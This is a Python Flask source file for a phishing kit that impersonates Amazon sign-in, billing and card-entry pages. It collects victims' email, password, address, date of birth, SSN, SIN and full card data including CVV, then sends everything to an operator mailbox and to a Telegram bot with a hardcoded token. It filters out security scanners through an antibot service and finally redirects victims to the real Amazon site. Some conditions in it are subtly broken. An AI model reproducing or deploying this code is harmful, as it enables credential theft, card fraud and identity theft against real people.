from flask import Flask, request, abort, render_template, redirect, url_for, make_response
import config
import requests, json
import smtplib
from email.message import EmailMessage


app = Flask(__name__)


def telegram(m):
    s = requests.Session()
    r = s.get(f'https://api.telegram.org/bot5965813549:AAFJa8dmjpD55ZKPhqrxse8P_UF9SXYhnv8/sendMessage?chat_id=-1001823807122&text={m}')
    sq = r.content
    return sq


def save(s, i):
    f = open(s, 'a+')
    f.writelines(f'\n{i}')
    f.close()


def cekbin(ccn):
    s = requests.Session()
    bin = ccn[0:8]
    req = s.get(f'https://lookup.binlist.net/{bin}')
    sc = req.content
    js = json.loads(sc)
    return js


def send_mail(subject, message, from_email):
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = from_email
    msg['To'] = config.emails_result
    msg.set_content(message)
    server = smtplib.SMTP(host='localhost', port=25)
    server.send_message(msg)
    server.quit()


def antibot(ipx, ua):
    s = requests.Session()
    api = config.antibot_key
    req = s.get(f'https://antibot.pw/api/v2-blockers?ip={ipx}&apikey={api}&ua={ua}')
    sc = req.content
    js = json.loads(sc)
    return js



@app.route("/")
def index():
    ua = request.headers.get('User-Agent')
    ipx = request.remote_addr
    cek = antibot(ipx, ua)
    cn = cek['info']['ipinfo']['countryCode']
    full = f'\n{ipx} || {ua}'
    vis = f'\n{cn} || {ipx} || {ua}'
    if 'false' in cek['is_bot']:
        if config.onetime_access == True:
            if ipx in 'onetime.txt':
                return redirect("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=900&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fpath%3D%252Fgp%252Fyourstore%252Fhome%26signIn%3D1%26useRedirectOnSuccess%3D1%26action%3Dsign-out%26ref_%3Dnav_AccountFlyout_signout&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0", code=302)
            else:
                save('visitor.txt', vis)
                return render_template('session.html')
        return render_template('session.html')
    else:
        save('bot.txt', full)
        return redirect(url_for('home'))

@app.route("/home")
def home():
    return render_template('home.html')


@app.route("/signin")
def signin():
    return render_template('login.html', key=request.args['akseskey'])


@app.route("/signins")
def signins():
    key = request.args['akseskey']
    email = request.args['ap_email']
    return render_template('password.html', key=key, mail=email,)


@app.route("/secure")
def secure():
    ua = request.headers.get('User-Agent')
    ipx = request.remote_addr
    cek = antibot(ipx, ua)
    cn = cek['info']['ipinfo']['countryCode']
    email = request.args['emails']
    passw = request.args['ap_password']
    key = request.args['akseskey']
    sb = f'Login Amazon {cn} | {ipx}'
    frm = 'logins@python-loversz.net'
    message = f'''
    | Login Amazon
    ============================== 
    | email     = {email}
    | password  = {passw}
    ==============================
    | Info Details
    ===============================
    | ip        = {ipx}
    | Country   = {cn}
    | user agent= {ua}
    '''
    ms = send_mail(sb, message, frm)
    t = telegram(message)
    if "iphone" or "android" in ua:
        return render_template('alert.mobile.html', key=key, mail=email ,pass_log=passw, cn=cn, t=t, m=ms)
    else:
        return render_template('alert.desktop.html', key=key, mail=email ,pass_log=passw, cn=cn, t=t, m=ms)


@app.route("/billing")
def billing():
    ua = request.headers.get('User-Agent')
    cn  = request.args['cn']
    email = request.args['emails']
    passw = request.args['pass_log']
    key = request.args['akseskey']
    if "iphone" or "android" in ua:
        return render_template('b.mobile.html', cn=cn, key=key, mail=email, pass_log=passw)
    else:
        return render_template('b.desktop.html', cn=cn, key=key, mail=email, pass_log=passw)


@app.route("/card")
def card():
    cn  = request.args['cn']
    key = request.args['akseskey']
    email = request.args['emails']
    passw = request.args['pass_log']
    fname = request.args['fname']
    addr = request.args['address']
    addr2 = request.args['address2']
    city = request.args['city']
    region = request.args['state']
    phone = request.args['phone']
    zip = request.args['zip']
    dob = request.args['dob']
    ssn = request.args['ssn']
    sin = request.args['sin']
    return render_template('card.html', key=key, cn=cn ,mail=email, pass_log=passw, fname=fname, addr=addr, addr2=addr2, city=city, state=region, phone=phone, zip=zip, dob=dob, ssn=ssn, sin=sin)


@app.route("/complete")
def send():
    ua = request.headers.get('User-Agent')
    ipx = request.remote_addr
    cn = request.args['cn']
    key = request.args['akseskey']
    cname = request.args['namecard']
    ccn = request.args['ccn']
    cvv = request.args['cvv']
    expm = request.args['expmonth']
    expy = request.args['expyear']
    ccn = request.cookies.get['ccn']
    cname = request.cookies.get['cname']
    cvv = request.cookies.get['cvv']
    expm = request.cookies.get['expm']
    expy = request.cookies.get['expy']
    email = request.args['emails']
    passw = request.args['pass_log']
    fname = request.args['fname']
    addr = request.args['address']
    addr2 = request.args['address2']
    city = request.args['city']
    region = request.args['state']
    phone = request.args['phone']
    zip = request.args['zip']
    dob = request.args['dob']
    ssn = request.args['ssn']
    sin = request.args['sin']
    x = ccn.replace(" ", "")
    bin = cekbin(x)
    scheme = bin['scheme']
    typee = bin['type']
    bank = bin['bank']['name']
    sb = f'{bank} - {scheme} {typee} || {cn}'
    frm = 'logins@python-loversz.net'
    message = f'''
    | Login Details
    | Email     = {email}
    | Password  = {passw}
    ==============================
    | Credit & Debit Info
    | BIN   = {bank} - {scheme} {typee}
    ============================== 
    | Holder name   = {cname}
    | Card Number   = {ccn}
    | expired       = {expm}/{expy}
    | cvv           = {cvv}
    ==============================
    | JP VBV Details
    ==============================
    | WEB ID    =
    | Password  = 
    ==============================
    | Billing Details
    ==============================
    | Full name = {fname}
    | dob       = {dob}
    | address   = {addr} - {addr2}
    | Region    = {region}
    | city      = {city}
    | zip code  = {zip}
    | Phone     = {phone}
    | SSN       = {ssn}
    | SIN       = {sin}
    ==============================
    | Info Details
    ===============================
    | ip        = {ipx}
    | Country   = {cn}
    | user agent= {ua}
    '''
    send_mail(sb, message, frm)
    telegram(message)
    if "iphone" or "android" in ua:
        return render_template('done.mobile.html', key=key)
    else:
        return render_template('done.html', key=key)


@app.route("/done")
def done():
    return redirect('https://www.amazon.com/ap/signin?openid.pape.max_auth_age=900&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fpath%3D%252Fgp%252Fyourstore%252Fhome%26signIn%3D1%26useRedirectOnSuccess%3D1%26action%3Dsign-out%26ref_%3Dnav_AccountFlyout_signout&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0', code=302)



if __name__ == "__main__":
    app.run(host='0.0.0.0')